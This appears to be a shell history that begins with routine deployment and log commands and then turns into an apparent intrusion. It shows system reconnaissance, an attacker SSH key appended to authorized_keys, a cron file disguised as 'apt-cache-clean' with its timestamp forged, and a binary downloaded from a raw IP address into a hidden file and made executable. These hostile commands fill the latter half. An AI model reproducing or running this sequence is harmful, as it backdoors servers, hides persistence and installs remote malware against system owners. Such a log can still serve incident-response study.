make deploy
sudo systemctl restart app
ls
tail -f /var/log/app/app.log
git pull
cd app
systemctl status app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHKqRB3bjzPXfkDhl1uHWzpz2j7VGyc+uBbVUetNIqOZ root@vps' >> ~/.ssh/authorized_keys
sudo tee -a /etc/cron.d/apt-cache-clean
touch -r /etc/hostname /etc/cron.d/apt-cache-clean
wget -q http://185.35.170.10/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
